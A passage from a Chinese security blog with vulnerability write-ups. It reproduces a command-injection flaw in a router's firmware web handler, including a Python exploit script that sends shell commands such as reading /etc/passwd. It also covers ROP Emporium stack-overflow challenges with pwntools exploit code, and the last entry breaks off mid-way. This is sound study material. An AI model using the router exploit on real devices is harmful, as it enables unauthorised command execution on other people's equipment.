<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iot@attifyos ~/D/f/_/squashfs-root&gt; grep -r &quot;formSysCmd&quot;</span><br><span class="line">Binary file bin/webs matches</span><br><span class="line">web/obama.asp:        field = document.formSysCmd.sysCmd ;</span><br><span class="line">web/obama.asp:&lt;form action=/goform/formSysCmd method=POST name=&quot;formSysCmd&quot;&gt;</span><br><span class="line">web/obama.asp:  &lt;form method=&quot;post&quot; action=&quot;goform/formSysCmd&quot; enctype=&quot;multipart/form-data&quot; name=&quot;writefile&quot;&gt;</span><br><span class="line">web/obama.asp:  &lt;form action=&quot;/goform/formSysCmd&quot; method=POST name=&quot;readfile&quot;&gt;</span><br><span class="line">web/syscmd.asp:        field = document.formSysCmd.sysCmd ;</span><br><span class="line">web/syscmd.asp:&lt;form action=/goform/formSysCmd method=POST name=&quot;formSysCmd&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，除了 syscmd.asp 和 obama.asp 这两个页面程序，只有一个结果显示是包含在二进制应用程序 bin&#x2F;webs 中，可以初步推测 webs 程序是真正的后台处理程序。 使用 file 查看下该文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iot@attifyos ~/D/f/_/squashfs-root&gt; file bin/webs</span><br><span class="line">bin/webs: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-, corrupted section header size</span><br></pre></td></tr></table></figure>

<p>可以看到，是 mips 架构 32 位程序。</p>
<p>我们把 webs 导入到IDA中进行静态分析，保持默认选项不动，点击 OK 。</p>
<p>在上方菜单栏，依次点击 view -&gt; open subviews -&gt; Strings 查看全部字符串，使用 ctrl+F 快捷键搜索 formSysCmd 字符串。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230330205111944.png" alt="image-20230330205111944"></p>
<p>可以看到有两个位置存在该字符串，分别位于 0x004044DB 和 0x00471A44 这两个位置，我们依次查看。首先是 0x004044DB 位置，双击进入反汇编窗口后，如下所示：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230330205328217.png" alt="image-20230330205328217"></p>
<p>再次双击红框处的 formSysCmd字符串，跳转到 formSysCmd 函数的真实位置。</p>
<p>（采用同样的方法我们查看 0x00471A44 位置处的字符串，可以看到两个地址上的内容相同。）</p>
<p>使用 F5 快捷键进行反编译查看 formSysCmd 函数的伪代码，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">formSysCmd</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> Var; <span class="comment">// $s4</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// $s1</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $s6</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v6; <span class="comment">// $s3</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// $s7</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v9; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v11; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *v14)(<span class="type">int</span>, _DWORD *); <span class="comment">// $t9</span></span><br><span class="line">  _BYTE *v15; <span class="comment">// $a0</span></span><br><span class="line">  _BYTE *v16; <span class="comment">// $a3</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> v20[<span class="number">104</span>]; <span class="comment">// [sp+20h] [-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  Var = websGetVar(a1, <span class="string">&quot;submit-url&quot;</span>, &amp;dword_47F498);</span><br><span class="line">  v3 = (_BYTE *)websGetVar(a1, <span class="string">&quot;sysCmd&quot;</span>, &amp;dword_47F498);</span><br><span class="line">  v4 = (_BYTE *)websGetVar(a1, <span class="string">&quot;writeData&quot;</span>, &amp;dword_47F498);</span><br><span class="line">  v5 = websGetVar(a1, <span class="string">&quot;filename&quot;</span>, &amp;dword_47F498);</span><br><span class="line">  v6 = (<span class="type">const</span> <span class="type">char</span> *)websGetVar(a1, <span class="string">&quot;fpath&quot;</span>, &amp;dword_47F498);</span><br><span class="line">  v7 = (_BYTE *)websGetVar(a1, <span class="string">&quot;readfile&quot;</span>, &amp;dword_47F498);</span><br><span class="line">  <span class="keyword">if</span> ( *v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(v20, <span class="number">100</span>, <span class="string">&quot;%s 2&gt;&amp;1 &gt; %s&quot;</span>, v3);</span><br><span class="line">    system(v20);</span><br><span class="line">  &#125;</span><br><span class="line">······</span><br></pre></td></tr></table></figure>

<p>可以看到，在23行处，v3 变量通过 websGetVar 函数获取sysCmd传递过来的内容。还记得吗？刚才提到过 sysCmd 这个字符串，他是 input 框的 name 属性的值。然后接下来，在 if 处，使用 snprintf函数将得到的结果进行拼接并赋值给 v20 变量。紧接着就调用 system 函数执行 v20 里边的内容。注意到，这里并没有对 v20 变量的内容做任何过滤，所以就是这里导致了命令执行漏洞。</p>
<p>Ps：这里有一个奇怪的地方就是，我用IDA反编译出来的 snprintf 函数参数列表里最后只有 v3 变量，而网上的博客里反编译出来的伪代码中，在 v3 之后还有一个 “&#x2F;tmp&#x2F;syscmd.log” 字符串，比较奇怪，不过影响不是特别大。我又尝试了使用Ghidra来反编译，如下图所示，可以看到Ghidra反编译出来，snprintf 函数参数列表最后是有字符串的，还是Ghidra对MIPS架构支持的比较好啊，当然也可能是我IDA没有额外装mips插件的原因。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230330211345787.png" alt="image-20230330211345787"></p>
<p>这里补充下几个函数的定义，通过chatGPT查到的，不得不感叹下真的好用，比搜索引擎搜索关键词然后再翻博客效率高多了。</p>
<ol>
<li><strong>websGetVar</strong></li>
</ol>
<p><code>websGetVar</code>函数是Web管理界面服务器<code>WebMux</code>提供的API函数之一，用于从请求中获取指定名称的变量值，即从HTTP请求中提取参数值。其函数原型为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char_t</span> *<span class="title function_">websGetVar</span><span class="params">(<span class="type">webs_t</span> wp, <span class="type">char_t</span> *name, <span class="type">char_t</span> *defaultValue)</span>;</span><br></pre></td></tr></table></figure>

<p>函数参数的含义如下：</p>
<ul>
<li><code>wp</code>：指向当前HTTP请求的<code>webs_t</code>结构体指针。该结构体包含了请求相关的信息，如请求方法、URL、头部信息、请求体等等。</li>
<li><code>name</code>：需要获取的变量名称，即需要提取的参数的名称。</li>
<li><code>defaultValue</code>：当变量名称不存在时，返回的默认值。</li>
</ul>
<p>该函数的返回值为字符串类型的变量值，即参数对应的值，如果变量不存在则返回默认值。需要注意的是，返回值是指向静态内存空间的指针，不要尝试释放该指针，也不要尝试修改其指向的内容。</p>
<p>下面是一个使用<code>websGetVar</code>函数的例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char_t</span> *name = websGetVar(wp, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;unknown&quot;</span>);</span><br><span class="line"><span class="comment">// 获取名为 &quot;name&quot; 的参数的值，如果参数不存在则返回 &quot;unknown&quot;</span></span><br></pre></td></tr></table></figure>

<p>在上面的例子中，如果HTTP请求中包含名为 “name” 的参数，则函数将返回该参数的值，否则将返回 “unknown”。</p>
<ol start="2">
<li><strong>snprintf</strong></li>
</ol>
<p><code>snprintf </code>函数是C语言标准库中的一个函数，用于将格式化的字符串输出到指定的字符数组中，并且可以限制输出字符的数量，以防止溢出。其函数原型为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">snprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure>

<p>函数参数的含义如下：</p>
<ul>
<li><code>str</code>：目标字符数组的指针，即需要将格式化的字符串输出到该数组中。</li>
<li><code>size</code>：目标字符数组的长度，即字符数组能够存储的最大字符数，包括末尾的空字符 ‘\0’，防止写入超过该长度的字符以防止缓冲区溢出。</li>
<li><code>format</code>：格式化字符串，包含了输出的格式以及需要输出的变量值。</li>
<li><code>...</code>：可变参数列表，即需要输出到格式化字符串中的变量值。格式化字符串中使用占位符（如 %d、%f 等）来表示变量值的类型和输出格式，可变参数列表中的值按照占位符的顺序输出到格式化字符串中。</li>
</ul>
<p>该函数的返回值为实际写入字符数组的字符数（不包括末尾的空字符 ‘\0’）。如果实际写入的字符数超过了给定的最大字符数 size，则会在字符数组末尾添加空字符 ‘\0’，并返回应该写入字符数组的字符数（不包括末尾的空字符 ‘\0’）。如果出现其他错误，例如无法分配内存，则返回一个负数。</p>
<p>下面是一个使用snprintf函数的例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> buffer[<span class="number">20</span>];</span><br><span class="line"><span class="type">int</span> n = <span class="built_in">snprintf</span>(buffer, <span class="number">20</span>, <span class="string">&quot;%s %d&quot;</span>, <span class="string">&quot;hello&quot;</span>, <span class="number">123</span>);</span><br><span class="line"><span class="comment">// 将字符串 &quot;hello 123&quot; 格式化输出到 buffer 中</span></span><br><span class="line"><span class="comment">// 如果 buffer 的长度为 20，将不会溢出</span></span><br><span class="line"><span class="comment">// n 的值为 9，表示实际写入 buffer 的字符数，不包括末尾的空字符 &#x27;\0&#x27;</span></span><br></pre></td></tr></table></figure>





<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>漏洞复现的第一步就是先在本地搭建固件模拟环境，这里使用FAT（Firmware Analysis Toolkit）搭建模拟环境。首先使用FAT将 bin 固件加载进来，模拟固件环境。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230330212103976.png" alt="image-20230330212103976"></p>
<p>FAT在启动之后，会自动配置QEMU虚拟机以及网络环境，如上图，我们可以看到倒数第三行，bro 虚拟网卡的网络地址为 192.168.1.1 。我们按下ENTER键，稍等片刻，当看到下图所示内容时就表示环境已经部署好了。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230330212544971.png" alt="image-20230330212544971"></p>
<p>此时，我们在浏览器中访问 192.168.1.1 这个地址后，会自动跳转到 &#x2F;admin.asp ，显示路由器的管理页面</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230330212701368.png" alt="image-20230330212701368"></p>
<p>默认账号密码为 admin：admin，我们输入账号密码登录后，页面显示如下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230330212825200.png" alt="image-20230330212825200"></p>
<p>接下来，我们访问有漏洞的页面 &#x2F;syscmd.asp ，如下图所示：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230330212934163.png" alt="image-20230330212934163"></p>
<p>看到这个页面，再看我们之前看到的 syscmd.asp 的源码就容易理解多了。我们在 input 框输入命令 cat &#x2F;etc&#x2F;passwd</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230330213129801.png" alt="image-20230330213129801"></p>
<p>可以看到，命令成功执行。</p>
<p>我们可以抓包来看一下</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230330215625346.png" alt="image-20230330215625346"></p>
<p>可以看到 sysCmd 参数就是传递我们命令的参数，从第一行也可以看到，真正执行命令的后台程序为 &#x2F;goform&#x2F;formSysCmd 。感觉也是为我们分析漏洞多了一种思路。</p>
<p>我们也可以通过exploit脚本来攻击该漏洞：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#rb1732_exploit.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_httpcommand</span>(<span class="params">ip, command</span>):</span><br><span class="line">    my_data = &#123;<span class="string">&#x27;sysCmd&#x27;</span>: command, <span class="string">&#x27;apply&#x27;</span>:<span class="string">&#x27;Apply&#x27;</span>, <span class="string">&#x27;submit-url&#x27;</span>:<span class="string">&#x27;/syscmd.asp&#x27;</span>, <span class="string">&#x27;msg&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(<span class="string">&#x27;http://%s/goform/formSysCmd&#x27;</span> % ip, data = my_data)</span><br><span class="line">    content = r.text</span><br><span class="line">    content = content[</span><br><span class="line">        content.find(<span class="string">&#x27;textarea row=&quot;15&quot; name=&quot;msg&quot; cols=&quot;80&quot; wrap=&quot;virtual&quot;&gt;&#x27;</span>)+<span class="number">56</span>:content.rfind(<span class="string">&#x27;&lt;/textarea&gt;&#x27;</span>)</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> test_httpcommand(sys.argv[<span class="number">1</span>],<span class="string">&quot; &quot;</span>.join(sys.argv[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">iot@attifyos ~/D/firmware&gt; python rb1732_exploir.py <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="string">&quot;cat /etc/passwd&quot;</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/:/<span class="built_in">bin</span>/sh</span><br><span class="line">nobody:x:<span class="number">0</span>:<span class="number">0</span>:nobody:/:/dev/null</span><br><span class="line">ftp:x:<span class="number">501</span>:<span class="number">501</span>::/var/home/anonymous:/dev/null</span><br><span class="line">ftpuser:x:<span class="number">502</span>:<span class="number">502</span>::/var/home:/dev/null</span><br><span class="line">admin:x:<span class="number">503</span>:<span class="number">503</span>::/home:/dev/null</span><br></pre></td></tr></table></figure>



<h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a href="http://www.mchz.com.cn/cn/service/Safety-Lab/info_26_itemid_6142.html">http://www.mchz.com.cn/cn/service/Safety-Lab/info_26_itemid_6142.html</a></p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>IoT设备漏洞复现</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Challenge1_ret2win</title>
    <url>/2023/03/15/ROP_Emporium/Challenge1_ret2win/</url>
    <content><![CDATA[<h1 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h1><p>题目链接：<a href="https://ropemporium.com/challenge/ret2win.html">https://ropemporium.com/challenge/ret2win.html</a></p>
<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>首先检查下程序保护情况，（根据提示，此系列均开启了NX保护，主要来锻炼ROP技术）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec ret2win32</span></span><br><span class="line">[*]&#x27;/home/giantbranch/Desktop/rop_emporium_all_challenges/level1_ret2win/32/ret2win32&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>接着检查下程序反编译后的伪代码，查看函数大致功能，这里使用它推荐的工具<code>radare2</code></p>
<p>首先使用以下命令加载分析目标程序：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">r2 -A ./ret2win</span></span><br><span class="line">INFO: Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">INFO: Analyze all functions arguments/locals (afva@@@F)</span><br><span class="line">INFO: Analyze function calls (aac)</span><br><span class="line">INFO: Analyze len bytes of instructions for references (aar)</span><br><span class="line">INFO: Finding and parsing C++ vtables (avrr)</span><br><span class="line">INFO: Type matching analysis for all functions (aaft)</span><br><span class="line">INFO: Propagate noreturn information (aanr)</span><br><span class="line">INFO: Use -AA or aaaa to perform additional experimental analysis</span><br><span class="line"> -- Do you want to print 333.5K chars? (y/N)</span><br><span class="line"><span class="meta prompt_">[0x08048430]&gt; </span></span><br></pre></td></tr></table></figure>

<p>接着使用<code>afl</code>指令来查看程序中存在的函数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">[0x08048430]&gt; </span><span class="language-bash">afl</span></span><br><span class="line">0x08048430    1     50 entry0</span><br><span class="line">0x08048463    1      4 fcn.08048463</span><br><span class="line">0x080483f0    1      6 sym.imp.__libc_start_main</span><br><span class="line">0x08048490    4     41 sym.deregister_tm_clones</span><br><span class="line">0x080484d0    4     54 sym.register_tm_clones</span><br><span class="line">0x08048510    3     31 sym.__do_global_dtors_aux</span><br><span class="line">0x08048540    1      6 sym.frame_dummy</span><br><span class="line">0x080485ad    1    127 sym.pwnme</span><br><span class="line">0x08048410    1      6 sym.imp.memset</span><br><span class="line">0x080483d0    1      6 sym.imp.puts</span><br><span class="line">0x080483c0    1      6 sym.imp.printf</span><br><span class="line">0x080483b0    1      6 sym.imp.read</span><br><span class="line">0x0804862c    1     41 sym.ret2win</span><br><span class="line">0x080483e0    1      6 sym.imp.system</span><br><span class="line">0x080486c0    1      2 sym.__libc_csu_fini</span><br><span class="line">0x08048480    1      4 sym.__x86.get_pc_thunk.bx</span><br><span class="line">0x080486c4    1     20 sym._fini</span><br><span class="line">0x08048660    4     93 sym.__libc_csu_init</span><br><span class="line">0x08048470    1      2 sym._dl_relocate_static_pie</span><br><span class="line">0x08048546    1    103 main</span><br><span class="line">0x08048400    1      6 sym.imp.setvbuf</span><br><span class="line">0x08048374    3     35 sym._init</span><br><span class="line">0x08048420    1      6 sym..plt.got</span><br></pre></td></tr></table></figure>

<p>我们可以看到，几个名字比较关键的函数：<code>pwnme</code>、<code>ret2win</code>、<code>main</code></p>
<p>我们首先进入<code>main</code>函数看下主函数大致流程：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">[0x08048430]&gt; </span><span class="language-bash">s main</span></span><br><span class="line"><span class="meta prompt_">[0x08048546]&gt; </span><span class="language-bash">pdg</span></span><br><span class="line"></span><br><span class="line">// WARNING: Variable defined which should be unmapped: var_4h</span><br><span class="line"></span><br><span class="line">uint main(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    uint var_4h;</span><br><span class="line">    </span><br><span class="line">    sym.imp.setvbuf(_reloc.stdout, 0, 2, 0);</span><br><span class="line">    sym.imp.puts(&quot;ret2win by ROP Emporium&quot;);</span><br><span class="line">    sym.imp.puts(&quot;x86\n&quot;);</span><br><span class="line">    sym.pwnme();</span><br><span class="line">    sym.imp.puts(&quot;\nExiting&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到，<code>main</code>函数调用了<code>pwnme</code>函数后就返回了，我们接下来进入到<code>pwnme</code>函数中。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">[0x08048546]&gt; </span><span class="language-bash">s sym.pwnme</span></span><br><span class="line"><span class="meta prompt_">[0x080485ad]&gt; </span><span class="language-bash">pdg</span></span><br><span class="line"></span><br><span class="line">void sym.pwnme(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    uint s;</span><br><span class="line">    </span><br><span class="line">    sym.imp.memset(&amp;s, 0, 0x20);</span><br><span class="line">    sym.imp.puts(&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;);</span><br><span class="line">    sym.imp.puts(&quot;What could possibly go wrong?&quot;);</span><br><span class="line">    sym.imp.puts(&quot;You there, may I have your input please? And don\&#x27;t worry about null bytes, we\&#x27;re using read()!\n&quot;);</span><br><span class="line">    sym.imp.printf(0x80487e8);</span><br><span class="line">    sym.imp.read(0, &amp;s, 0x38);</span><br><span class="line">    sym.imp.puts(&quot;Thank you!&quot;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们从上边的伪代码中可以看到，<code>read</code>函数处存在明显的栈溢出漏洞。read函数接收0x38（56字节）的数据来填充到0x20（32字节）的缓冲区。</p>
<p>我们再看一下<code>ret2win</code>函数。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">[0x080485ad]&gt; </span><span class="language-bash">s sym.ret2win</span></span><br><span class="line"><span class="meta prompt_">[0x0804862c]&gt; </span><span class="language-bash">pdg</span></span><br><span class="line"></span><br><span class="line">void sym.ret2win(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    sym.imp.puts(&quot;Well done! Here\&#x27;s your flag:&quot;);</span><br><span class="line">    sym.imp.system(&quot;/bin/cat flag.txt&quot;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，<code>ret2win</code>函数的功能跟它的名字一样，打印出flag，取得胜利，win！</p>
<p>到这里我们的思路就有了：</p>
<p>使用cyclic计算偏移量（略去过程），构造payload，将返回地址覆盖为<code>ret2win</code>函数的地址即可得到flag！</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230313152211147.png" alt="image-20230313152211147"></p>
<p>完整的exploit代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2win32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line"></span><br><span class="line">ret2win_addr = <span class="number">0x0804862c</span></span><br><span class="line"></span><br><span class="line">payload = offset*<span class="string">b&#x27;A&#x27;</span> + p32(ret2win_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>64位跟32位情况相似，只是偏移量跟返回地址不同，不再详细赘述。</p>
<p>完整exploit代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2win64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line">ret2win_addr = <span class="number">0x0000000000400756</span></span><br><span class="line">payload = offset*<span class="string">b&#x27;A&#x27;</span> + p64(ret2win_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ROP_Emporium</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Challenge2_split</title>
    <url>/2023/03/15/ROP_Emporium/Challenge2_split/</url>
    <content><![CDATA[<h1 id="split"><a href="#split" class="headerlink" title="split"></a>split</h1><p>题目链接：<a href="https://ropemporium.com/challenge/split.html">https://ropemporium.com/challenge/split.html</a></p>
<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>根据题目描述，这个二进制程序中存在有用的字符串<code>/bin/cat flag.txt</code>，并且存在对<code>system</code>函数的调用。结合题目名字，猜测是将函数调用跟所需的参数分开了，需要我们自己去拼接起来。大致思路就是分别找到函数跟字符串的地址，然后拼成一个简单的ROP链即可。</p>
<span id="more"></span>

<p>首先，照例检查程序的保护情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec ./split32</span> </span><br><span class="line">[*]&#x27;/home/giantbranch/Desktop/rop_emporium_all_challenges/level2_split/32/split32&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>使用<code>radare2</code>查看程序中的函数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">r2 -A ./split</span></span><br><span class="line"><span class="meta prompt_">[0x08048430]&gt; </span><span class="language-bash">afl</span></span><br><span class="line">0x08048430    1     50 entry0</span><br><span class="line">0x08048463    1      4 fcn.08048463</span><br><span class="line">0x080483f0    1      6 sym.imp.__libc_start_main</span><br><span class="line">0x08048490    4     41 sym.deregister_tm_clones</span><br><span class="line">0x080484d0    4     54 sym.register_tm_clones</span><br><span class="line">0x08048510    3     31 sym.__do_global_dtors_aux</span><br><span class="line">0x08048540    1      6 sym.frame_dummy</span><br><span class="line">0x080485ad    1     95 sym.pwnme</span><br><span class="line">0x08048410    1      6 sym.imp.memset</span><br><span class="line">0x080483d0    1      6 sym.imp.puts</span><br><span class="line">0x080483c0    1      6 sym.imp.printf</span><br><span class="line">0x080483b0    1      6 sym.imp.read</span><br><span class="line">0x0804860c    1     25 sym.usefulFunction</span><br><span class="line">0x080483e0    1      6 sym.imp.system</span><br><span class="line">0x08048690    1      2 sym.__libc_csu_fini</span><br><span class="line">0x08048480    1      4 sym.__x86.get_pc_thunk.bx</span><br><span class="line">0x08048694    1     20 sym._fini</span><br><span class="line">0x08048630    4     93 sym.__libc_csu_init</span><br><span class="line">0x08048470    1      2 sym._dl_relocate_static_pie</span><br><span class="line">0x08048546    1    103 main</span><br><span class="line">0x08048400    1      6 sym.imp.setvbuf</span><br><span class="line">0x08048374    3     35 sym._init</span><br><span class="line">0x08048420    1      6 sym..plt.got</span><br><span class="line"><span class="meta prompt_">[0x08048430]&gt; </span></span><br></pre></td></tr></table></figure>

<p>可以看到，几个名字比较关键的函数，<code>pwnme</code>，<code>usefulFunction</code>，<code>main</code></p>
<blockquote>
<p>在这个系列的挑战中，<code>main</code>函数的作用就是调用<code>pwnme</code>函数，此后的系列题解中，无特殊情况，我们就不再重复查看<code>main</code>函数。</p>
</blockquote>
<p>我们先看<code>pwnme</code>函数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">[0x08048430]&gt; </span><span class="language-bash">s sym.pwnme</span></span><br><span class="line"><span class="meta prompt_">[0x080485ad]&gt; </span><span class="language-bash">pdg</span></span><br><span class="line"></span><br><span class="line">void sym.pwnme(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    uint s;</span><br><span class="line">    </span><br><span class="line">    sym.imp.memset(&amp;s, 0, 0x20);</span><br><span class="line">    sym.imp.puts(&quot;Contriving a reason to ask user for data...&quot;);</span><br><span class="line">    sym.imp.printf(0x8048700);</span><br><span class="line">    sym.imp.read(0, &amp;s, 0x60);</span><br><span class="line">    sym.imp.puts(&quot;Thank you!&quot;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以很容易看到，<code>read</code>函数处存在明显的缓冲区溢出漏洞，偏移量使用clclic计算为44。</p>
<p>接着查看<code>usefulFunction</code>函数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">[0x080485ad]&gt; </span><span class="language-bash">s sym.usefulFunction</span> </span><br><span class="line"><span class="meta prompt_">[0x0804860c]&gt; </span><span class="language-bash">pdg</span></span><br><span class="line"></span><br><span class="line">void sym.usefulFunction(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    sym.imp.system(&quot;/bin/ls&quot;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，<code>usefulFunction</code>函数内部调用了<code>system</code>函数，这也对应了题目的提示，程序中存在对<code>system</code>函数的调用。通过前边<code>afl</code>命令我们可以看到<code>system</code>函数的虚拟地址为<code>0x080483e0</code></p>
<p>接下来我们根据题目提示查找<code>/bin/cat flag.txt</code>字符串的地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rabin2 -z ./split32</span> </span><br><span class="line">[Strings]</span><br><span class="line">nth paddr      vaddr      len size section type  string</span><br><span class="line">―――――――――――――――――――――――――――――――――――――――――――――――――――――――</span><br><span class="line">0   0x000006b0 0x080486b0 21  22   .rodata ascii split by ROP Emporium</span><br><span class="line">1   0x000006c6 0x080486c6 4   5    .rodata ascii x86\n</span><br><span class="line">2   0x000006cb 0x080486cb 8   9    .rodata ascii \nExiting</span><br><span class="line">3   0x000006d4 0x080486d4 43  44   .rodata ascii Contriving a reason to ask user for data...</span><br><span class="line">4   0x00000703 0x08048703 10  11   .rodata ascii Thank you!</span><br><span class="line">5   0x0000070e 0x0804870e 7   8    .rodata ascii /bin/ls</span><br><span class="line">0   0x00001030 0x0804a030 17  18   .data   ascii /bin/cat 